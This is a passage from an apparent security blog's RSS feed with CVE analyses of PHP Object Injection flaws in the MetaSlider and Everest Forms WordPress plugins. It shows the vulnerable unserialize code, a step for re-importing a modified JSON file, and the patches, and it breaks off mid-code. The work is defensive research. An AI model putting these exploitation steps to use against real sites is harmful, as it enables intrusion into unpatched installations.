0,&#xA;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#34;original_id&#34;: 265,&#xA;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#34;post_excerpt&#34;: &#34;&#34;&#xA;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;}&#xA;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;],&#xA;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#34;title&#34;: &#34;New Slideshow&#34;&#xA;&amp;ensp;&amp;ensp;},&#xA;&amp;ensp;&amp;ensp;&#34;metadata&#34;: {&#xA;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#34;date&#34;: &#34;2025/11/26&#34;,&#xA;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#34;version&#34;: &#34;3.94.0&#34;&#xA;&amp;ensp;&amp;ensp;}&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;Re-import the modified JSON file.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-11-26-cve-2025-26763/result.png&#34; title=&#34;Result&#34; data-thumbnail=&#34;/posts/2025-11-26-cve-2025-26763/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Result&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-26-cve-2025-26763/result.png&#39; alt=&#34;Result&#34; height=&#34;575&#34; width=&#34;1042&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Result&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;The vulnerability occurs because the plugin calls &lt;code&gt;maybe_unserialize()&lt;/code&gt; directly on imported data without validation, allowing injection of malicious serialized payloads that lead to PHP Object Injection. Version 3.95.0 fixes this by blocking serialized objects and using a safer unserialize function.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Never unserialize user-controlled data without validation.&lt;/li&gt;&#xA;&lt;li&gt;Import/export features are always sensitive attack surfaces.&lt;/li&gt;&#xA;&lt;li&gt;Serialized data (especially starting with &lt;code&gt;O:&lt;/code&gt;) must be controlled.&lt;/li&gt;&#xA;&lt;li&gt;Use &lt;code&gt;allowed_classes&amp;ensp;=&amp;gt;&amp;ensp;false&lt;/code&gt; to prevent object creation during unserialize.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Deserialization&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/ml-slider/vulnerability/wordpress-slider-gallery-and-carousel-by-metaslider-image-slider-video-slider-plugin-3-94-0-php-object-injection-vulnerability?_s_id=cve&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Responsive Slider by MetaSlider Plugin &amp;lt;= 3.94.0 is vulnerable to PHP Object Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-3439 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-11-25-cve-2025-3439/</link>
      <pubDate>Tue, 25 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-11-25-cve-2025-3439/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-25-cve-2025-3439/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Plugin Everest Forms â€“ Contact Form, Quiz, Survey, Newsletter &amp;amp; Payment Form Builder for WordPress&lt;/strong&gt; on WordPress contains a &lt;strong&gt;PHP Object Injection&lt;/strong&gt; vulnerability in all versions up to and including &lt;strong&gt;3.1.1&lt;/strong&gt;, through unsafe unserialization of untrusted data from the parameter &lt;code&gt;field_value&lt;/code&gt;.&#xA;This allows an &lt;strong&gt;unauthenticated attacker&lt;/strong&gt; to inject a PHP object. The vulnerable software &lt;strong&gt;does not contain any known POP chain&lt;/strong&gt;, meaning the flaw will not lead to practical exploitation unless another plugin or theme on the website contains a compatible POP chain.&#xA;If such a POP chain exists through an additional plugin or theme installed on the target system, it may allow the attacker to perform actions such as &lt;strong&gt;arbitrary file deletion&lt;/strong&gt;, &lt;strong&gt;data theft&lt;/strong&gt;, or even &lt;strong&gt;remote code execution&lt;/strong&gt;, depending on the available POP chain.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-3439&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-3439&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: PHP Object Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.1.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 3.1.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.8)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/everest-forms/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Everest Forms Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Everest Forms&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;3.1.1&lt;/code&gt; â€“ &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;3.1.2&lt;/code&gt; â€“ &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; â†’ &lt;a href=&#34;https://meldmerge.org/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any other diff tool.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;In the vulnerable version (v3.1.1):&lt;/strong&gt;&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$field_value&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;||&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;is_numeric&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$field_value&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;is_serialized&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$field_value&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$field_value&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;maybe_unserialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$field_value&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In this snippet, &lt;strong&gt;&lt;code&gt;maybe_unserialize()&lt;/code&gt;&lt;/strong&gt; is directly executed on user-provided input (&lt;code&gt;$field_value&lt;/code&gt;). This introduces a critical risk:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Object Injection Risk&lt;/strong&gt;: If the attacker embeds a PHP object payload within serialized data, the decode and unserialize process will instantiate a malicious object, potentially leading to &lt;strong&gt;Object Injection&lt;/strong&gt; and escalation towards &lt;strong&gt;Remote Code Execution (RCE)&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Missing safety validation&lt;/strong&gt;: No data validation is performed before unserialization.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;No fallback handling&lt;/strong&gt;: If the input is invalid or malicious, no alternative error processing is performed, leaving the system open to exploitation.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;The patch (v3.1.2):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-11-25-cve-2025-3439/diff.png&#34; title=&#34;Patch changes&#34; data-thumbnail=&#34;/posts/2025-11-25-cve-2025-3439/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;Patch changes&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-25-cve-2025-3439/diff.png&#39; alt=&#34;Diff&#34; height=&#34;243&#34; width=&#34;1831&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Patch changes&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;The patch replaces &lt;code&gt;maybe_unserialize()&lt;/code&gt; with a safer function &lt;code&gt;evf_maybe_unserialize()&lt;/code&gt;:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;evf_maybe_unserialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$options&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;is_serialized&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;version_compare&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;PHP_VERSION&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;7.1.0&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;gt;=&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$options&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;wp_parse_args&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$options&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;allowed_classes&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;unserialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;trim&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$options&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//phpcs:ignore.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;unserialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;trim&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//phpcs:ignore.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span 